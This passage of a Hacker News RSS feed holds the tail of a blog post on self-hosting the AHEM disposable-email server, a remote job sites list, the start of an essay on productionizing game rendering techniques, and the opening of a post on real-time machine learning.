<p>I'm not that familiar with node.js, so there might be a better way of doing this, but I was struggling to keep it running when I closed my ssh connection.</p>

<p>I could just run it as a background process (by appending &amp; to the command), but I installed  pm2:</p>

<pre><code>npm install pm2 -g
</code></pre>

<p>and then ran it using:</p>

<pre><code>pm2 start ahem.js
</code></pre>



<p>Now, I have a simple to use, self-hosted, web page, which lets me generate random email addresses to paste into webforms when I want a disposable address.</p>

<p>I need to refresh the page to check if an email has arrived, but that's fine. I should check if there's something I've not configured correctly, as I'd have thought it would refresh periodically, if nothing fancier existed to show an email when it arrives.</p>

<p>Email are deleted automatically when they are 24 hours old; again, this is something configurable via .env, but that seems fine as a default.</p>



<p>A couple of weeks ago, AHEM <a href="https://github.com/o4oren/Ad-Hoc-Email-Server/pull/41/commits/4c4bc7fb34a056ff47abc96d32c066023d7c7e37">changed its licence</a> from an in-house job to Apache 2.0.</p>

<p>This is a good decision, IMHO, but still needs to be reflected in the AHEM interface, since this says that it's only "available for personal and internal use".</p>
                    <hr>
                    
                    
                </div>
            </div>
        </div></div>]]>
            </description>
            <link>https://neilzone.co.uk/2020/12/self-hosted-disposable-email-addresses-with-ahem</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557661</guid>
            <pubDate>Mon, 28 Dec 2020 08:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Remote Job Sites to Find Your Dream Job]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25557608">thread link</a>) | @ofou
<br/>
December 28, 2020 | https://www.digitalnomadsoul.com/best-remote-job-sites/ | <a href="https://web.archive.org/web/*/https://www.digitalnomadsoul.com/best-remote-job-sites/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><div><p>Maybe you are looking for a job you can do from home because you are tired of your daily commute or because you want to spend more time with your family. Maybe you want to travel a bit more and that’s why you are looking for a location-independent position. No matter what your reason is, online jobs are more popular than ever before. Check out the best remote job sites to find an online job you can do anywhere and anytime.</p><h2><span id="How_Important_Are_Online_Jobs"></span>How Important Are Online Jobs?<span></span></h2><p>Before we jump right into the list, let’s have a look at some facts and numbers.</p><p>40% of the entire American workforce will be doing <a href="https://www.officevibe.com/blog/11-incredible-coworking-statistics-infographic" target="_blank" rel="noopener noreferrer">freelance work in 2020</a>. There are estimations, that <a href="https://levels.io/future-of-digital-nomads/" target="_blank" rel="noopener noreferrer">by the year 2035 there will be 1 billion digital nomads</a> on this planet. That means that remote jobs will become more and more important. People are realizing, that the location-independent lifestyle has many advantages. The Digital Nomad Survey from 2016 shows, what people like most about this lifestyle:</p><ul><li>It gives them a better work/life balance than office work.</li><li>85% of all digital nomads feel happier with this lifestyle.</li><li>They are less stressed when they do telecommuting work.</li><li>They also enjoy schedule flexibility, the fact that they can work from home and don’t have to commute anymore.</li></ul><p>The industry has taken note of that, too. By the end of 2017, more than <a href="http://www.deskmag.com/en/the-complete-2017-coworking-forecast-more-than-one-million-people-work-from-14000-coworking-spaces-s" target="_blank" rel="noopener noreferrer">14,000 coworking spaces</a> will be in operation around the world, providing location-independent professionals an alternative working environment.</p><p>Moreover, remote job sites are booming and new websites dedicated to online jobs are appearing on a regular basis. These websites show not only open positions for<strong> freelancers</strong>, but also for people who seek to work in a <strong>permanent contract</strong> with a company, but on a remote basis.</p><p>Some of these websites are free to use, but you have to pay a certain fee once you close a deal or a certain percentage of the agreed payment. Other websites charge you to search for jobs, but you don’t have to pay anything once you close a contract. Very few are entirely free to use.</p><p>The following list includes the most popular remote job sites out there. Have a look around and find the platform that works best for you.</p><p><img loading="lazy" src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-1024x682.jpg" alt="Remote Job Sites, Digital Nomad, Online Job, Make Money Online, Location-Independent Job, Job Search, Hire Remote Worker, Freelancer" width="515" height="343" srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-768x512.jpg 768w" sizes="(max-width: 515px) 100vw, 515px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20515%20343'%3E%3C/svg%3E" data-lazy-srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-768x512.jpg 768w" data-lazy-src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-1024x682.jpg"></p><h2><span id="The_Best_Remote_Job_Sites"></span>The Best Remote Job Sites<span></span></h2><h3><span id="FlexJobs"></span>FlexJobs<span></span></h3><p><a href="http://flexjobsrocks.go2cloud.org/aff_c?offer_id=1&amp;aff_id=1722" target="_blank" rel="nofollow noopener noreferrer">Flexjobs </a>is focused on part-time, full-time and flexible remote jobs and has more than 100 job categories.&nbsp; All jobs are hand-screened so you can be sure it’s not a scam. Here you can also find jobs with reputable companies, such as Apple, Dell or the American Red Cross.</p><p>In addition to that, it provides resources for things like skills testing or research the company that is hiring. Brilliant website for everyone who is just at the beginning of their remote career!</p><h3><span id="99Designs"></span>99Designs<span></span></h3><p><a href="https://99designs.com/" target="_blank" rel="noopener noreferrer">99 Designs</a> is the perfect job site for you if you have some great graphic design skills. You can find project work and also meet longer-term clients.</p><h3><span id="AngeList"></span>AngeList<span></span></h3><p><a href="https://angel.co/" target="_blank" rel="noopener noreferrer">AngelList </a>is very popular for its great list of startup jobs. You can find jobs in all fields, such as finance or engineering. Simply apply the remote filter option to display location-independent positions only.</p><h3><span id="Apres"></span>Après<span></span></h3><p><a href="https://apresgroup.com/" target="_blank" rel="noopener noreferrer">Après&nbsp;</a>is the perfect remote job site for moms who want to have a flexible job. You can find freelance or contract based jobs here, full-time or part-time ones at startups, media, and tech industries.</p><h3><span id="Authentic_Jobs"></span>Authentic Jobs<span></span></h3><p><a href="https://www.authenticjobs.com/" target="_blank" rel="noopener noreferrer">Authentic Jobs</a> is a website that offers both local, and remote jobs. It has a variety of positions for designers, creative professionals and hackers and provides a lot of extra information around the jobs.</p><h3><span id="Axiom_Law"></span>Axiom Law<span></span></h3><p><a href="https://www.axiomlaw.com/" target="_blank" rel="noopener noreferrer">Axiom law</a> is basically a digital law firm that places attorneys either in local or in remote positions. If you are looking for an alternative to a traditional law firm, this is your place to be.</p><h3><span id="Career_Builder"></span>Career Builder<span></span></h3><p>Many big and well-known companies trust <a href="http://www.careerbuilder.com/" target="_blank" rel="noopener noreferrer">Career Builder</a> to find their new talents. You can create a profile and search for certain employment types and compensation.</p><h3><span id="CloudPeeps"></span>CloudPeeps<span></span></h3><p><a href="https://www.cloudpeeps.com/" target="_blank" rel="noopener noreferrer">CloudPeeps</a> connects freelancers and clients mainly in the fields of content creation, marketing, social media and community building. Gigs are usually between 30 and 150 USD per hour.</p><h3><span id="Crossover"></span>Crossover<span></span></h3><p><a href="https://www.crossover.com/#index" target="_blank" rel="noopener noreferrer">Crossover</a> offers local and remote jobs by some very popular companies. This is one of the few remote job sites that offer fulltime long-term careers only, each of them high paying. Jobs are in any field from marketing to executive management, to software development.</p><h3><span id="Dribble_Jobs"></span>Dribble Jobs<span></span></h3><p><a href="https://dribbble.com/jobs" target="_blank" rel="noopener noreferrer">Dribble Jobs </a>is specifically for designers and offers mainly local jobs, but has an extra filter for remote positions, too.</p><h3><span id="EuropeRemotely"></span>EuropeRemotely<span></span></h3><p><a href="http://europeremotely.com/" target="_blank" rel="noopener noreferrer">EuropeRemotely</a> lists only jobs for people who are based in European time zones. Although that is a bit unusual for remote job sites, it does make sense. It also offers jobs for developers only.</p><h3><span id="F6s"></span>F6s<span></span></h3><p><a href="https://www.f6s.com/" target="_blank" rel="noopener noreferrer">F6s</a> is a popular website for startup organizations to find their talents. It lets you filter out the remote positions and you can search by equity and compensation.</p><h3><span id="Fiverr"></span>Fiverr<span></span></h3><p>Freelancers can offer their services on<a href="https://www.fiverr.com/" target="_blank" rel="noopener noreferrer"> Fiverr </a>for clients to book them. These gigs often start from 5 USD per service and can be anything from IT support, to content writing, to marketing work, or something completely different, like performing a custom rap song.</p><h3><span id="Freelancer"></span>Freelancer<span></span></h3><p><a href="https://www.freelancer.com/" target="_blank" rel="noopener noreferrer">Freelancer</a> is one of the most popular remote job sites, which connects freelancers of all kinds to employers. You can either work on a fixed price basis, charge hourly rates or bid and participate in contests.</p><h3><span id="Freelancermap"></span>Freelancermap<span></span></h3><p><a href="https://www.freelancermap.com/" target="_blank" rel="noopener noreferrer">Freelancermap</a> is a platform where IT professionals and businesses come together. The average project pays about 200 USD and is all about IT.</p><p><img loading="lazy" src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg" alt="Remote Job Sites, Digital Nomad, Online Job, Make Money Online, Location-Independent Job, Job Search, Hire Remote Worker, Freelancer" width="512" height="340" srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg 724w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5-300x199.jpg 300w" sizes="(max-width: 512px) 100vw, 512px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20512%20340'%3E%3C/svg%3E" data-lazy-srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg 724w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5-300x199.jpg 300w" data-lazy-src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg"></p><h3><span id="GrowthGeeks"></span>GrowthGeeks<span></span></h3><p>As you can tell from the name, <a href="http://www.growthgeeks.com/" target="_blank" rel="noopener noreferrer">GrowthGeeks </a>is a marketplace that is specialized in growing startups and businesses. While you can find many different jobs here, the majority focus on generating growth via social media or marketing projects.</p><h3><span id="Guru"></span>Guru<span></span></h3><p><a href="https://www.guru.com/" target="_blank" rel="noopener noreferrer">Guru</a> is a platform that lists location-independent jobs only. They offer a wide range of positions, often focused on web development, content writing or translation.</p><h3><span id="Hubstaff_Talent"></span>Hubstaff Talent<span></span></h3><p><a href="https://talent.hubstaff.com/" target="_blank" rel="noopener noreferrer">Hubstaff Talent</a> is a rather new remote job site, that connects freelancers and businesses for free. Offered jobs are in any field from web development to customer service to content writing.</p><h3><span id="Idealist"></span>Idealist<span></span></h3><p><a href="http://idealistcareers.org/tag/remote-jobs/" target="_blank" rel="noopener noreferrer">Idealist</a> is one of the very few remote job sites, that doesn’t list any tech-related jobs at all. Instead, you can find a great selection of fields like health, youth, or legal assistance.</p><h3><span id="Indeed"></span>Indeed<span></span></h3><p>No doubt you have heard about<a href="http://www.indeed.com/" target="_blank" rel="noopener noreferrer"> Indeed</a> before. What many people don’t know: You can also find great online jobs on this platform. All you have to do is insert “remote” in the preferred location box and off you go.</p><h3><span id="Jobrack"></span>Jobrack<span></span></h3><p><a href="https://jobrack.eu/" target="_blank" rel="noopener noreferrer">Jobrack</a> is specialized in finding high-quality employees from Eastern Europe and match them with digital business owners.</p><h3><span id="Jobscribe"></span>Jobscribe<span></span></h3><p>On Jobscribe you can find job openings for tech startups. That can be jobs in development, design or marketing. You can also subscribe to a daily email with new openings.</p><h3><span id="Jobspresso"></span>Jobspresso<span></span></h3><p><a href="https://jobspresso.co/" target="_blank" rel="noopener noreferrer">Jobspresso</a> offers many different kinds of work. You can find tech jobs, like developing or engineering, but also positions in marketing, writing or admin work.</p><h3><span id="Maven"></span>Maven<span></span></h3><p>To use <a href="http://www.maven.co/" target="_blank" rel="noopener noreferrer">Maven</a>’s words, they are a “micro-consulting platform”. Freelancers create a profile with their expertise and hourly rate and can then be hired on a project basis.</p><h3><span id="Peopleforce"></span>Peopleforce<span></span></h3><p><a href="http://www.peopleforce.com/" target="_blank" rel="noopener noreferrer">Peopleforce</a> is an enterprise crowdsourcing platform that is ideal for freelancers who are interested in data entry, data cleaning, research, and tagging jobs.</p><h3><span id="Power_To_Fly"></span>Power To Fly<span></span></h3><p><a href="https://powertofly.com/" target="_blank" rel="noopener noreferrer">Power To Fly</a> is another one of the few remote job sites designed for women only, who are interested in tech positions. They join a talent base, have to go through a vetting and then get matched to a job. After a 2-4 week paid test period they either get the job or not.</p><h3><span id="ProBlogger"></span>ProBlogger<span></span></h3><p><a href="https://problogger.com/" target="_blank" rel="noopener noreferrer">ProBlogger</a> has a job board for everyone passionate about writing. Clients look for people who are interested in producing blog content, consult on their blog, or design one.</p><h3><span id="Proonto"></span>Proonto<span></span></h3><p><a href="https://proonto.com/" target="_blank" rel="noopener noreferrer">Proonto</a> is the perfect place for product and customer service experts. Here businesses are looking for remote assistance to help their e-commerce shoppers.</p><h3><span id="ProZ"></span>ProZ<span></span></h3><p><a href="http://www.proz.com/" target="_blank" rel="noopener noreferrer">ProZ </a>is probably the world’s largest translator network. It provides a massive choice of translation work for freelancers and is often the first address for professional translators.</p><h3><span id="Remote_co"></span>Remote.co<span></span></h3><p><a href="https://remote.co/" target="_blank" rel="noopener noreferrer">Remote.co</a> is one of the most popular remote job sites. Therefore, you can also find an open position with big companies, like Amazon or TED. More than just the job search this platform offers you advice and tips about remote work in general.</p><h3><span id="Remote_Jobs"></span>Remote Jobs<span></span></h3><p>Remote Jobs offer openings the IT field, which are fulltime and 100% remote. The quick search makes it easy to find appropriate jobs and the weekly newsletter keeps you updated.</p><h3><span id="Remote_OK"></span>Remote OK<span></span></h3><p><a href="https://remoteok.io/" target="_blank" rel="noopener noreferrer">Remote OK</a> gives you the option to search by pay scale and see a list of companies, who employ remote professionals. You have a massive choice of tech-related jobs, as well as all kinds of non-tech jobs, such as writing, sales, social media management, or human resource.</p><h3><span id="Remote_Tech_Work"></span>Remote Tech Work<span></span></h3><p>As the name states clearly, <a href="http://remotetechwork.com/" target="_blank" rel="noopener noreferrer">Remote Tech Work </a>provides location-independent jobs for developers, support engineers, testers, and designers.</p><h3><span id="Remote_Working"></span>Remote Working<span></span></h3><p>Most of the jobs on<a href="http://www.remoteworking.co/" target="_blank" rel="noopener noreferrer"> Remote Working</a> are tech-related. It also allows you to filter for part-time, freelancer or internship positions.</p><h3><span id="Remotive"></span>Remotive<span></span></h3><p><a href="https://remotive.io/" target="_blank" rel="noopener noreferrer">Remotive</a> is another website that provides work-from-anywhere jobs in many different areas. If you want to they send you a newsletter every two weeks with their new job listings.</p><h3><span id="Ruby_Now"></span>Ruby Now<span></span></h3><p>As the name suggests, <a href="https://jobs.rubynow.com/" target="_blank" rel="noopener noreferrer">Ruby Now</a> connects employers with ruby specialists. They have more than 5,000 job openings and provide additional information about ruby-related topics.</p><p><img loading="lazy" src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg" alt="Remote Job Sites, Digital Nomad, Online Job, Make Money Online, Location-Independent Job, Job Search, Hire Remote Worker, Freelancer" width="503" height="335" srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-768x512.jpg 768w" sizes="(max-width: 503px) 100vw, 503px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20503%20335'%3E%3C/svg%3E" data-lazy-srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-768x512.jpg 768w" data-lazy-src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg"></p><h3><span id="Stack_Overflow_Careers"></span>Stack Overflow Careers<span></span></h3><p><a href="https://stackoverflow.com/jobs" target="_blank" rel="noopener noreferrer">Stack Overflow Careers </a>focusses on programmers. You can explore remote jobs, that are based in a certain area and look up career salaries.</p><h3><span id="Staff"></span>Staff<span></span></h3><p><a href="https://staff.com/" target="_blank" rel="noopener noreferrer">Staff</a> may be one of the smaller remote job sites, but it is 100% free. Means neither job seekers, not employers have to pay to connect.</p><h3><span id="Skip_The_Drive"></span>Skip The Drive<span></span></h3><p><a href="https://www.skipthedrive.com/" target="_blank" rel="noopener noreferrer">Skip The Drive</a> offers more than just the usual job openings. It also allows you to track your applications, get work-from-home tips and find the best companies for remote work. In …</p></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.digitalnomadsoul.com/best-remote-job-sites/">https://www.digitalnomadsoul.com/best-remote-job-sites/</a></em></p>]]>
            </description>
            <link>https://www.digitalnomadsoul.com/best-remote-job-sites/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557608</guid>
            <pubDate>Mon, 28 Dec 2020 08:15:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics challenging? Productionizing rendering algorithms]]>
            </title>
            <description>
<![CDATA[
Score 128 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25557431">thread link</a>) | @bartwr
<br/>
December 27, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557431</guid>
            <pubDate>Mon, 28 Dec 2020 07:26:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine learning is going real-time]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557412">thread link</a>) | @yoquan
<br/>
December 27, 2020 | https://huyenchip.com/2020/12/27/real-time-machine-learning.html | <a href="https://web.archive.org/web/*/https://huyenchip.com/2020/12/27/real-time-machine-learning.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>After talking to machine learning and infrastructure engineers at major Internet companies across the US, Europe, and China, I noticed two groups of companies. One group has made significant investments (hundreds of millions of dollars) into infrastructure to allow real-time machine learning and has already seen returns on their investments. Another group still wonders if there’s value in real-time ML.</p>

<p>There seems to be little consensus on what real-time ML means, and there hasn’t been a lot of in-depth discussion on how it’s done in the industry. In this post, I want to share what I’ve learned after talking to about a dozen companies that are doing it.</p>

<p>There are two levels of real-time machine learning that I’ll go over in this post.</p>
<ul>
  <li>Level 1: Your ML system makes predictions in real-time (online predictions).</li>
  <li>Level 2: Your system can incorporate new data and update your model in real-time (online learning).</li>
</ul>

<p>I use “model” to refer to the machine learning model and “system” to refer to the infrastructure around it, including data pipeline and monitoring systems.</p>

<hr>
<p><b>Table of contents</b><br>
…. <a href="#online_predictions">Level 1: Online predictions - your system can make predictions in real-time</a><br>
…….. <a href="#online_predictions_use_cases">Use cases</a><br>
………… <a href="#problems_batch_predictions">Problems with batch predictions</a><br>
…….. <a href="#online_predictions_solutions">Solutions</a><br>
………… <a href="#fast_inference">Fast inference</a><br>
………… <a href="#stream_pipeline">Real-time pipeline</a><br>
……………. <a href="#stream_processing_vs_batch_processing">Stream processing vs. batch processing</a><br>
……………. <a href="#event_driven_vs_request_driven">Event-driven vs. request-driven</a><br>
…….. <a href="#online_predictions_challenges">Challenges</a><br>
…. <a href="#online_learning">Level 2: Online learning - your system can incorporate new data and update in real-time</a><br>
…….. <a href="#online_learning_definition">Defining “online learning”</a><br>
…….. <a href="#online_learning_use_cases">Use case</a><br>
…….. <a href="#online_learning_solutions">Solutions</a><br>
…….. <a href="#online_learning_challenges">Challenges</a><br>
………… <a href="#online_learning_theoretical_challenges">Theoretical</a><br>
………… <a href="#online_learning_practical_challenges">Practical</a><br>
…. <a href="#mlops_china_vs_us">The MLOps race between the US and China</a><br>
…. <a href="#conclusion">Conclusion</a><br></p>

<hr>

